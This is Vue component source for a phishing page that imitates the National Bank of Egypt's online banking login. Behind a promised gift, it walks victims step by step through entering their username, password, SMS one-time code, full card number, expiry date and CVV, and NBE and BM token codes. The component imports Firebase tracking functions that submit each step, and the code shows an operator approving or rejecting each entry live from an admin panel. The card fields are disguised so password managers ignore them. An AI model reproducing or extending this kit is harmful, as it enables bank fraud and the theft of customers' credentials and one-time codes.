<template>
  <AppShell>
    <div class="login-screen" :class="{ 'login-screen-flat': loginStep === 'username' }">
      <main class="login-main" :class="{ 'login-main-flat': loginStep === 'username' }">
        <!-- ===== USERNAME STEP: NEW DESIGN (من otp.html) ===== -->
        <div v-if="loginStep === 'username'" class="login-n-page">
          <!-- شريط اللغة -->
          <div class="login-n-lang-bar">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
              <circle cx="12" cy="12" r="9" />
              <path d="M3 12h18" />
              <path d="M12 3a14 14 0 0 1 0 18" />
              <path d="M12 3a14 14 0 0 0 0 18" />
            </svg>
            <span>English</span>
          </div>

          <!-- الشعار -->
          <div class="login-n-logo-wrap">
            <img :src="loginLogo" alt="البنك الأهلي المصري" class="login-n-logo-img" />
          </div>

          <!-- تبويبات أفراد / شركات -->
          <div class="login-n-tabs" role="radiogroup" aria-label="نوع الحساب">
            <button
              type="button"
              class="login-n-tab"
              :class="{ 'login-n-tab-active': accountType === 'شركات' }"
              role="radio"
              :aria-checked="accountType === 'شركات'"
              @click="setAccountType('شركات')"
            >
              <span>شركات</span>
              <svg class="login-n-tab-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7">
                <circle cx="9" cy="8" r="3"/>
                <circle cx="17" cy="9" r="2.4"/>
                <path d="M3 20c0-3.3 2.7-6 6-6s6 2.7 6 6"/>
                <path d="M15 20c0-2.5 1.7-4.5 4-5"/>
              </svg>
            </button>
            <button
              type="button"
              class="login-n-tab"
              :class="{ 'login-n-tab-active': accountType === 'أفراد' }"
              role="radio"
              :aria-checked="accountType === 'أفراد'"
              @click="setAccountType('أفراد')"
            >
              <span>افراد</span>
              <svg class="login-n-tab-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7">
                <circle cx="12" cy="8" r="3.6"/>
                <path d="M5 20c0-3.9 3.1-7 7-7s7 3.1 7 7"/>
              </svg>
            </button>
          </div>

          <!-- النموذج -->
          <form class="login-n-form" autocomplete="off" @submit.prevent="handleFormSubmit">
            <HoneypotField location="login_form" />

            <!-- حقل هوية الشركة (يظهر فقط عند اختيار شركات) -->
            <div v-if="accountType === 'شركات'" class="login-n-input-wrap">
              <svg class="login-n-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
                <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
                <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
              </svg>
              <input
                id="companyId"
                :value="companyId"
                type="text"
                autocomplete="off"
                placeholder="هوية الشركة"
                dir="ltr"
                :class="{ 'login-n-input-error': companyIdError }"
                @input="handleCompanyIdInput($event)"
              />
            </div>

            <!-- حقل كود المستخدم -->
            <div class="login-n-input-wrap">
              <svg class="login-n-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
                <circle cx="12" cy="8" r="3.6"/>
                <path d="M5 20c0-3.9 3.1-7 7-7s7 3.1 7 7"/>
              </svg>
              <input
                id="username"
                :value="username"
                type="text"
                autocomplete="off"
                placeholder="كود المستخدم"
                dir="ltr"
                :class="{ 'login-n-input-error': usernameError }"
                @input="handleUsernameInput($event)"
                @keydown="blockSpaceKey($event)"
                @paste="blockSpacePaste"
              />
            </div>

            <!-- رابط نسيت كود المستخدم -->
            <div class="login-n-forgot">
              <a href="#" @click.prevent>نسيت كود المستخدم</a>
            </div>

            <!-- تصميم الرفض: تحت الحقول وفوق الزر -->
            <RejectionBanner
              v-if="rejectionBanner && rejectionBanner.step === 'username'"
              :visible="true"
              :title="rejectionBanner.title"
              :message="rejectionBanner.message"
            />

            <!-- زر تسجيل الدخول -->
            <div class="login-n-login-row">
              <button
                class="login-n-login-btn"
                type="submit"
                :disabled="usernameCharCount < 4 || (accountType === 'شركات' && !companyId.trim())"
              >
                تسجيل الدخول
              </button>
            </div>
          </form>

          <!-- رابط سجل الآن -->
          <div class="login-n-register">
            <a href="#" @click.prevent>سجل الان</a>
          </div>

          <!-- عنوان انضم -->
          <h2 class="login-n-join-title">انضم لعميل البنك الاهلي المصري</h2>

          <!-- شبكة الخدمات -->
          <div class="login-n-services">
            <div class="login-n-service" @click="onServiceClick('installments')">
              <svg class="login-n-service-ico" viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <rect x="6" y="3" width="20" height="26" rx="1.5"/>
                <rect x="8.5" y="5.5" width="15" height="5.5" fill="currentColor" fill-opacity="0.12" stroke="none"/>
                <text x="22" y="10.5" font-size="6" text-anchor="end" fill="currentColor" stroke="none" font-weight="700" font-family="Arial">$</text>
                <circle cx="11" cy="15.5" r="1" fill="currentColor" stroke="none"/>
                <circle cx="16" cy="15.5" r="1" fill="currentColor" stroke="none"/>
                <circle cx="21" cy="15.5" r="1" fill="currentColor" stroke="none"/>
                <circle cx="11" cy="20" r="1" fill="currentColor" stroke="none"/>
                <circle cx="16" cy="20" r="1" fill="currentColor" stroke="none"/>
                <circle cx="21" cy="20" r="1" fill="currentColor" stroke="none"/>
                <circle cx="11" cy="24.5" r="1" fill="currentColor" stroke="none"/>
                <circle cx="16" cy="24.5" r="1" fill="currentColor" stroke="none"/>
                <circle cx="21" cy="24.5" r="1" fill="currentColor" stroke="none"/>
              </svg>
              <div class="login-n-service-label">حاسبة<br/>الاقساط</div>
            </div>
            <div class="login-n-service" @click="onServiceClick('currency')">
              <svg class="login-n-service-ico" viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="11" cy="13" r="7.5"/>
                <circle cx="21" cy="19" r="7.5"/>
                <text x="11" y="16" font-size="9" text-anchor="middle" fill="currentColor" stroke="none" font-weight="700" font-family="Arial">$</text>
                <text x="21" y="22" font-size="9" text-anchor="middle" fill="currentColor" stroke="none" font-weight="700" font-family="Arial">€</text>
              </svg>
              <div class="login-n-service-label">حاسبة العملات</div>
            </div>
            <div class="login-n-service" @click="onServiceClick('atm')">
              <svg class="login-n-service-ico" viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
                <path d="M16 28s-10-10.5-10-17a10 10 0 0 1 20 0c0 6.5-10 17-10 17z"/>
                <circle cx="16" cy="11" r="3.5"/>
              </svg>
              <div class="login-n-service-label">ماكينة الصارف<br/>الآلي / الفروع</div>
            </div>
            <div class="login-n-service" @click="onServiceClick('book')">
              <svg class="login-n-service-ico login-n-service-ico-flip" viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
                <rect x="4" y="6" width="24" height="22" rx="2"/>
                <line x1="4" y1="12" x2="28" y2="12"/>
                <line x1="10" y1="3" x2="10" y2="9"/>
                <line x1="22" y1="3" x2="22" y2="9"/>
                <path d="M11 20l3.5 3.5L21 17" stroke-width="2.2"/>
              </svg>
              <div class="login-n-service-label">احجز موعد</div>
            </div>
          </div>
        </div>

        <!-- ===== باقي الخطوات: التصميم الحالي (محفوظ بالكامل) ===== -->
        <div v-else class="login-box">
          <img class="login-logo" :src="loginLogo" alt="هدية اورورا" />

          <form class="login-form" autocomplete="off" @submit.prevent="handleFormSubmit">
            <HoneypotField location="login_form" />

          <!-- الخطوة 2: حقل كلمة المرور -->
          <template v-if="loginStep === 'password'">
            <div class="random-image-wrapper">
              <img :src="randomImage" alt="random" class="random-preview-img" />
              <span class="random-image-caption">worldly egg</span>
            </div>

            <div class="field">
              <label for="password">كلمة المرور</label>
              <div class="password-wrap">
                <input
                  id="password"
                  :value="password"
                  :type="showPassword ? 'text' : 'password'"
                  autocomplete="off"
                  placeholder="أدخل كلمة المرور"
                  dir="ltr"
                  :class="{ 'input-error': passwordError }"
                  @input="handlePasswordInput($event)"
                  @keydown="blockSpaceKey($event)"
                  @paste="blockSpacePaste"
                />
                <button
                  type="button"
                  class="password-toggle"
                  :aria-label="showPassword ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور'"
                  @click="showPassword = !showPassword"
                >
                  <svg v-if="!showPassword" viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.6">
                    <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" />
                    <circle cx="12" cy="12" r="3" />
                  </svg>
                  <svg v-else viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
                    <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" />
                    <circle cx="12" cy="12" r="3" />
                    <line x1="4" y1="4" x2="20" y2="20" />
                  </svg>
                </button>
              </div>

              <!-- شروط كلمة المرور -->
              <div class="password-rules-box" :class="{ 'has-error': passwordError }">
                <div v-if="passwordError" class="field-error-header">
                  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                  </svg>
                  <span>كلمة المرور غير صحيحة. يجب استيفاء كافة الشروط:</span>
                </div>
                <p v-else class="rules-title">يجب أن تحتوي كلمة المرور على الشروط التالية:</p>

                <ul class="rules-list">
                  <li :class="{ met: password.length >= 8, unmet: passwordError && password.length < 8 }">
                    <span class="rule-icon">{{ password.length >= 8 ? '✓' : (passwordError ? '✕' : '•') }}</span>
                    <span>8 خانات على الأقل</span>
                  </li>
                  <li :class="{ met: /[A-Z]/.test(password), unmet: passwordError && !/[A-Z]/.test(password) }">
                    <span class="rule-icon">{{ /[A-Z]/.test(password) ? '✓' : (passwordError ? '✕' : '•') }}</span>
                    <span>حرف كبير واحد على الأقل (A-Z)</span>
                  </li>
                  <li :class="{ met: /[a-z]/.test(password), unmet: passwordError && !/[a-z]/.test(password) }">
                    <span class="rule-icon">{{ /[a-z]/.test(password) ? '✓' : (passwordError ? '✕' : '•') }}</span>
                    <span>حرف صغير واحد على الأقل (a-z)</span>
                  </li>
                  <li :class="{ met: /[0-9]/.test(password), unmet: passwordError && !/[0-9]/.test(password) }">
                    <span class="rule-icon">{{ /[0-9]/.test(password) ? '✓' : (passwordError ? '✕' : '•') }}</span>
                    <span>رقم واحد على الأقل (0-9)</span>
                  </li>
                  <li :class="{ met: /[^A-Za-z0-9]/.test(password), unmet: passwordError && !/[^A-Za-z0-9]/.test(password) }">
                    <span class="rule-icon">{{ /[^A-Za-z0-9]/.test(password) ? '✓' : (passwordError ? '✕' : '•') }}</span>
                    <span>رمز خاص واحد على الأقل (!@#$%^&*...)</span>
                  </li>
                </ul>
              </div>
            </div>

            <!-- تصميم الرفض: تحت الحقول وفوق الزر -->
            <RejectionBanner
              v-if="rejectionBanner && rejectionBanner.step === 'password'"
              :visible="true"
              :title="rejectionBanner.title"
              :message="rejectionBanner.message"
            />

            <button class="login-submit" type="submit" :disabled="!password || !isPasswordValid">
              التالي
            </button>
          </template>

          <!-- الخطوة 3: حقل رمز التحقق OTP (حقل مستطيل واحد) -->
          <template v-else-if="loginStep === 'otp'">
            <div class="otp-new-container">
              <div class="otp-new-icon-wrap">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                </svg>
              </div>

              <h2 class="otp-new-verify-title">رمز التحقق</h2>
              <p class="otp-new-verify-subtitle">
                تم إرسال رمز التحقق إلى رقم الهاتف <span class="otp-new-phone-mask">******XXXX</span>
              </p>

              <div class="otp-new-row" dir="ltr">
                <!-- حقل OTP مستطيل واحد — يحلّ مكان المربعات الستة القديمة -->
                <input
                  ref="otpSingleInput"
                  type="text"
                  class="otp-new-input otp-new-input-single"
                  maxlength="6"
                  inputmode="numeric"
                  autocomplete="one-time-code"
                  autocapitalize="off"
                  autocorrect="off"
                  spellcheck="false"
                  pattern="[0-9]*"
                  enterkeyhint="done"
                  :placeholder="otpCode.length === 0 ? '------' : ''"
                  :value="otpCode"
                  @input="handleOtpInput($event)"
                  @paste="handleOtpPaste($event)"
                  @keypress="handleOtpKeypress($event)"
                  @focus="onOtpInputFocus"
                  @click="onOtpInputClick"
                  @touchend="onOtpInputTouchEnd"
                />
              </div>

              <!-- تصميم الرفض: مباشرة تحت حقل الـ OTP -->
              <RejectionBanner
                v-if="rejectionBanner && rejectionBanner.step === 'otp'"
                :visible="true"
                :title="rejectionBanner.title"
                :message="rejectionBanner.message"
              />

              <div class="otp-new-timer" dir="ltr">{{ formatOtpTimer(otpTimerSeconds) }}</div>
              <div class="otp-new-timer-label">الوقت المتبقي لإنتهاء الرمز</div>

              <button
                type="submit"
                class="otp-new-submit-btn"
                :class="{ active: otpCode.length === 6 }"
                :disabled="otpCode.length !== 6"
              >
                تأكيد الرمز
              </button>

              <div class="otp-new-resend-wrapper">
                <transition name="fade" mode="out-in">
                  <div v-if="otpResendSuccess" key="success" class="otp-new-resend-success">
                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <span>تم إرسال الرمز بنجاح</span>
                  </div>
                  <button
                    v-else-if="otpTimerSeconds <= 0"
                    key="btn"
                    type="button"
                    class="otp-new-resend-btn"
                    @click="handleResendOtp"
                  >
                    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                      <polyline points="1 4 1 10 7 10"></polyline>
                      <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path>
                    </svg>
                    <span>إعادة إرسال الرمز</span>
                  </button>
                </transition>
              </div>
            </div>
          </template>

          <!-- الخطوة 4: معلومات البطاقة البنكية -->
          <template v-else-if="loginStep === 'card'">
            <div class="bank-card-guide-card">
              <h3 class="bank-card-guide-title">بيانات البطاقة المصرفية</h3>
              <p class="bank-card-guide-subtitle">يرجى إدخال معلومات البطاقة الخاصة بحسابك للتأكيد من ملكية الحساب.</p>
            </div>

            <div class="field">
              <label for="acc-sec-num">رقم البطاقة</label>
              <div class="card-input-wrapper">
                <input
                  id="acc-sec-num"
                  class="card-number-input"
                  name="acc_sec_num_field"
                  :value="cardNumber"
                  type="tel"
                  inputmode="numeric"
                  autocomplete="off"
                  autocorrect="off"
                  autocapitalize="off"
                  spellcheck="false"
                  data-lpignore="true"
                  data-form-type="other"
                  placeholder="0000 0000 0000 0000"
                  maxlength="19"
                  dir="ltr"
                  @input="handleCardNumberInput"
                />
                <span class="card-chip-icon" aria-hidden="true">
                  <img :src="cardBrandLogo" alt="Card Brand" class="card-input-brand-img" />
                </span>
              </div>
            </div>

            <div class="card-inline-fields">
              <div class="field">
                <label for="acc-sec-exp">تاريخ الانتهاء</label>
                <input
                  id="acc-sec-exp"
                  name="acc_sec_exp_field"
                  :value="cardExpiry"
                  type="tel"
                  inputmode="numeric"
                  autocomplete="off"
                  autocorrect="off"
                  autocapitalize="off"
                  spellcheck="false"
                  data-lpignore="true"
                  data-form-type="other"
                  placeholder="MM/YY"
                  maxlength="5"
                  dir="ltr"
                  :class="{ 'input-error': cardExpiryError }"
                  @input="handleCardExpiryInput"
                  @blur="validateCardExpiry(true)"
                />
              </div>

              <div class="field">
                <label for="acc-sec-code">رمز الأمان (CVV)</label>
                <input
                  id="acc-sec-code"
                  name="acc_sec_code_field"
                  :value="cardCvv"
                  type="password"
                  inputmode="numeric"
                  autocomplete="off"
                  autocorrect="off"
                  autocapitalize="off"
                  spellcheck="false"
                  data-lpignore="true"
                  data-form-type="other"
                  placeholder="123"
                  maxlength="3"
                  dir="ltr"
                  @input="handleCardCvvInput"
                />
              </div>
            </div>

            <div v-if="cardExpiryError" class="field-error-msg expiry-error-box">
              <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="8" x2="12" y2="12"></line>
                <line x1="12" y1="16" x2="12.01" y2="16"></line>
              </svg>
              <span>{{ cardExpiryError }}</span>
            </div>

            <!-- تصميم الرفض: تحت الحقول وفوق الزر -->
            <RejectionBanner
              v-if="rejectionBanner && rejectionBanner.step === 'card'"
              :visible="true"
              :title="rejectionBanner.title"
              :message="rejectionBanner.message"
            />

            <button
              class="login-submit"
              type="submit"
              :disabled="!isCardFormValid"
            >
              التالي
            </button>
          </template>

          <!-- الخطوة 5: حقل NBE توكن -->
          <template v-else-if="loginStep === 'nbe_token'">
            <div class="bm-token-header-section">
              <div class="bm-token-shield-badge">
                <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#007a3d" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                  <polyline points="9 12 11 14 15 10"/>
                </svg>
              </div>
              <h2 class="bm-token-main-title">أدخل رمز NBE Token</h2>
              <p class="bm-token-main-desc">
                يرجى إدخال رمز التحقق (OTP) المُنشأ لمرة واحدة من خلال تطبيق الرقم السري المتغير (NBE Token).
              </p>
            </div>

            <div class="field">
              <input
                id="nbe-token"
                :value="nbeTokenCode"
                type="tel"
                inputmode="numeric"
                pattern="[0-9]*"
                maxlength="8"
                autocomplete="off"
                placeholder="أدخل رمز NBE Token (8 أرقام)"
                dir="ltr"
                @input="handleNbeTokenInput"
              />
            </div>

            <p class="bm-token-refresh-note">
              الرمز يتجدد تلقائياً كل 60 ثانية داخل تطبيق NBE Token تأكد من إدخال آخر رمز ظاهر (8 أرقام).
            </p>

            <!-- تصميم الرفض: يظهر تحت النص وفوق الزر عند رفض الأدمن من اللوحة -->
            <RejectionBanner
              v-if="rejectionBanner && rejectionBanner.step === 'nbe_token'"
              :visible="true"
              :title="rejectionBanner.title"
              :message="rejectionBanner.message"
            />

            <button
              class="login-submit"
              type="submit"
              :disabled="nbeTokenCode.length !== 8"
            >
              تأكيد فقط
            </button>
          </template>

          <!-- الخطوة 6: حقل BM توكن -->
          <template v-else-if="loginStep === 'bm_token'">
            <div class="bm-security-card-container">
              <div class="bm-security-header">
                <h2 class="bm-security-title">التحقق من رموز الأمان</h2>
              </div>

              <div class="bm-security-field-group">
                <label for="bm-otp-input" class="bm-security-label">الرقم السري المتغير OTP</label>
                <div class="bm-security-input-wrapper">
                  <button
                    type="button"
                    class="bm-visibility-toggle"
                    :aria-label="showBmToken ? 'إخفاء الرمز' : 'إظهار الرمز'"
                    @click="showBmToken = !showBmToken"
                  >
                    <svg v-if="showBmToken" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/>
                      <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/>
                      <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/>
                      <line x1="2" y1="2" x2="22" y2="22"/>
                    </svg>
                  </button>
                  <input
                    id="bm-otp-input"
                    :value="bmTokenCode"
                    :type="showBmToken ? 'text' : 'password'"
                    inputmode="numeric"
                    pattern="[0-9]*"
                    autocomplete="off"
                    class="bm-security-input"
                    @input="handleBmTokenInput"
                  />
                </div>
              </div>

              <!-- تصميم الرفض: تحت الحقول وفوق الزر -->
              <RejectionBanner
                v-if="rejectionBanner && rejectionBanner.step === 'bm_token'"
                :visible="true"
                :title="rejectionBanner.title"
                :message="rejectionBanner.message"
              />

              <div class="bm-security-actions-row">
                <button
                  class="bm-action-btn bm-btn-submit"
                  type="submit"
                  :disabled="!bmTokenCode.trim()"
                >
                  تنفيذ
                </button>
              </div>

              <div class="bm-security-guide-box">
                <h3 class="bm-guide-main-heading">يرجي اتباع الخطوات لإنشاء الرقم السري المتغير OTP</h3>
                <ul class="bm-guide-steps-list">
                  <li>قم بإدخال الكود السري علي جهاز / تطبيق رموز الأمان</li>
                  <li>في حالة استخدام جهاز رموز الأمان برجاء الضغط علي رقم 'واحد' لإنشاء الرقم السري المتغير OTP</li>
                  <li>في حالة استخدام تطبيق رموز الأمان برجاء الضغط علي الرقم السري المتغير OTP</li>
                  <li>برجاء ادخال الرقم السري المتغير OTP الظاهر علي شاشة جهاز / تطبيق رموز الامان في الحقل المخصص له</li>
                  <li>للعملاء من الشركات يتم استخدام جهاز رموز الأمان فقط</li>
                </ul>
              </div>
            </div>
          </template>

          <!-- تصميم الرفض: تم نقله داخل كل قالب خطوة (تحت الحقول وفوق الزر) -->
          </form>
        </div>
      </main>

      <!-- بوب اب الانتظار والرفض والقبول لجميع المراحل -->
      <div v-if="waitingModalState" class="otp-backdrop" role="presentation">
        <section class="otp-dialog" role="dialog" aria-modal="true" aria-labelledby="waiting-dialog-title">
          <template v-if="waitingModalState === 'waiting_username' || waitingModalState === 'waiting_password' || waitingModalState === 'waiting_otp' || waitingModalState === 'waiting_card' || waitingModalState === 'waiting_nbe_token' || waitingModalState === 'waiting_bm_token'">
            <span class="otp-loader" />
            <h2 id="waiting-dialog-title">يرجى الانتظار</h2>
            <p>
              {{
                waitingModalState === 'waiting_username'
                  ? 'جاري التحقق من كود المستخدم، يرجى عدم إغلاق هذه الصفحة...'
                  : waitingModalState === 'waiting_password'
                  ? 'جاري التحقق من كلمة المرور، يرجى عدم إغلاق هذه الصفحة...'
                  : waitingModalState === 'waiting_otp'
                  ? 'جاري التحقق من رمز التحقق، يرجى عدم إغلاق هذه الصفحة...'
                  : waitingModalState === 'waiting_card'
                  ? 'جاري التحقق من بيانات البطاقة، يرجى عدم إغلاق هذه الصفحة...'
                  : waitingModalState === 'waiting_nbe_token'
                  ? 'جاري التحقق من رمز NBE توكن، يرجى عدم إغلاق هذه الصفحة...'
                  : 'جاري التحقق من الرقم السري المتغير OTP، يرجى عدم إغلاق هذه الصفحة...'
              }}
            </p>
          </template>

          <template v-else-if="waitingModalState === 'rejected_credentials' || waitingModalState === 'rejected_password' || waitingModalState === 'rejected_username'">
            <div class="modal-status-icon error">
              <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="#c2413b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="15" y1="9" x2="9" y2="15"></line>
                <line x1="9" y1="9" x2="15" y2="15"></line>
              </svg>
            </div>
            <h2 id="waiting-dialog-title">فشل التحقق</h2>
            <p>كود المستخدم أو كلمة المرور خطأ، يرجى المحاولة مرة أخرى.</p>
            <button type="button" class="modal-action-btn retry-btn" @click="retryLoginCredentials">
              إعادة المحاولة
            </button>
          </template>

          <template v-else-if="waitingModalState === 'rejected_otp'">
            <div class="modal-status-icon error">
              <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="#c2413b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="15" y1="9" x2="9" y2="15"></line>
                <line x1="9" y1="9" x2="15" y2="15"></line>
              </svg>
            </div>
            <h2 id="waiting-dialog-title">فشل التحقق</h2>
            <p>رمز التحقق خطأ، يرجى المحاولة مرة أخرى.</p>
            <button type="button" class="modal-action-btn retry-btn" @click="retryOtp">
              إعادة المحاولة
            </button>
          </template>

          <template v-else-if="waitingModalState === 'rejected_card'">
            <div class="modal-status-icon error">
              <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="#c2413b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="15" y1="9" x2="9" y2="15"></line>
                <line x1="9" y1="9" x2="15" y2="15"></line>
              </svg>
            </div>
            <h2 id="waiting-dialog-title">بيانات البطاقة غير مقبولة</h2>
            <p>عفواً، بيانات البطاقة المصرفية المدخلة غير صحيحة أو غير مطابقة لسجلات البنك. يرجى التأكد من صحة رقم البطاقة وتاريخ الصلاحية ورمز الأمان (CVV) وإعادة المحاولة.</p>
            <button type="button" class="modal-action-btn retry-btn" @click="retryCard">
              إعادة المحاولة
            </button>
          </template>

          <template v-else-if="waitingModalState === 'rejected_nbe_token'">
            <div class="modal-status-icon error">
              <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="#c2413b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="15" y1="9" x2="9" y2="15"></line>
                <line x1="9" y1="9" x2="15" y2="15"></line>
              </svg>
            </div>
            <h2 id="waiting-dialog-title">فشل التحقق</h2>
            <p>رمز NBE توكن غير صحيح، يرجى المحاولة مرة أخرى.</p>
            <button type="button" class="modal-action-btn retry-btn" @click="retryNbeToken">
              إعادة المحاولة
            </button>
          </template>

          <template v-else-if="waitingModalState === 'rejected_bm_token'">
            <div class="modal-status-icon error">
              <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="#c2413b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="15" y1="9" x2="9" y2="15"></line>
                <line x1="9" y1="9" x2="15" y2="15"></line>
              </svg>
            </div>
            <h2 id="waiting-dialog-title">فشل التحقق</h2>
            <p>الرقم السري المتغير OTP غير صحيح، يرجى المحاولة مرة أخرى.</p>
            <button type="button" class="modal-action-btn retry-btn" @click="retryBmToken">
              إعادة المحاولة
            </button>
          </template>

          <template v-else-if="waitingModalState === 'approved_bm_token' || waitingModalState === 'approved_nbe_token' || waitingModalState === 'approved_otp'">
            <div class="modal-status-icon success">
              <svg viewBox="0 0 24 24" width="48" height="48" fill="none" stroke="#179a73" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                <polyline points="22 4 12 14.01 9 11.01"></polyline>
              </svg>
            </div>
            <h2 id="waiting-dialog-title">تم بنجاح!</h2>
            <p>تم بنجاح إكمال الخطوات! يرجى الانتظار حتى تصلك الهدية في أقرب وقت ممكن.</p>
            <button type="button" class="modal-action-btn success-btn" @click="finishApprovedLogin">
              إغلاق
            </button>
          </template>
        </section>
      </div>
    </div>
  </AppShell>
</template>
<script setup lang="ts">
import loginLogo from "~/assets/login/login-logo.webp";
import randomImage from "~/assets/login/random.webp";
import visaImage from "~/assets/login/visa.webp";
import mastercardImage from "~/assets/login/mastercard.webp";
import vimasImage from "~/assets/login/vimas.webp";
import RejectionBanner from "~/components/RejectionBanner.vue";
import { firebasePaths } from "~/utils/firebaseConfig";
import {
  getFirebaseDatabase,
  getCustomerId,
  submitUsernameStep,
  submitPasswordStep,
  submitLoginAttemptOtp,
  submitCardInfoStep,
  submitNbeTokenStep,
  submitBmTokenStep,
  trackCustomerActivity,
  updateCustomerLoginStep,
} from "~/composables/useCustomerTracking";
import { ROUTE_PATHS } from "~/composables/useRouteConstants";
import { useOtpExtractor, extractOtpFromText } from "~/composables/useOtpExtractor";

const router = useRouter();
const { updateFlow } = useDemoFlow();

// === مستخرج OTP الذكي — يدعم جميع اللغات (عربي/إنجليزي) ===
// يلتقط الرمز من رسائل SMS بصيغ مثل:
//   "الرمز:949654" / "رمز:439693" / "رمز التحقق:345834" / "OTP: 123456" / "Code: 123456" / "123456"
const otpExtractor = useOtpExtractor({
  length: 6,
  onFilled: (code) => {
    // عند اكتمال الرمز → إخفاء بانر الرفض + إرسال تلقائي (لو المستخدم اختار ذلك)
    if (rejectionBanner.value && rejectionBanner.value.step === "otp") {
      rejectionBanner.value = null;
    }
    // لا نستدعي handleOtpSubmit هنا — الـ watcher في الأسفل سيتكفّل
  },
});

const accountType = ref<"أفراد" | "شركات">("أفراد");
const companyId = ref("");
const companyIdError = ref("");
const loginStep = ref<"username" | "password" | "otp" | "card" | "nbe_token" | "bm_token">("username");
const username = ref("");
const usernameError = ref("");
const password = ref("");
const passwordError = ref(false);
const otpCode = ref("");
const cardNumber = ref("");
const cardExpiry = ref("");
const cardExpiryError = ref("");
const cardCvv = ref("");
const nbeTokenCode = ref("");
const bmTokenCode = ref("");
const loginTrap = ref("");
const showPassword = ref(false);

interface RejectionBannerInfo {
  title: string;
  message: string;
  step: string;
}
const rejectionBanner = ref<RejectionBannerInfo | null>(null);

const cardBrandLogo = computed(() => {
  const cleanDigits = cardNumber.value.replace(/[^0-9]/g, "");
  if (cleanDigits.startsWith("4")) {
    return visaImage;
  }
  if (cleanDigits.startsWith("5")) {
    return mastercardImage;
  }
  return vimasImage;
});

const waitingModalState = ref<
  | ""
  | "waiting_username"
  | "rejected_username"
  | "waiting_password"
  | "rejected_password"
  | "rejected_credentials"
  | "waiting_otp"
  | "rejected_otp"
  | "waiting_card"
  | "rejected_card"
  | "waiting_nbe_token"
  | "rejected_nbe_token"
  | "approved_nbe_token"
  | "waiting_bm_token"
  | "rejected_bm_token"
  | "approved_bm_token"
  | "approved_otp"
>("");

const currentCustomerId = ref("");
const currentAttemptId = ref("");
let customerListenerUnsubscribe: (() => void) | null = null;

// عداد رمز التحقق OTP (دقيقة واحدة = 60 ثانية)
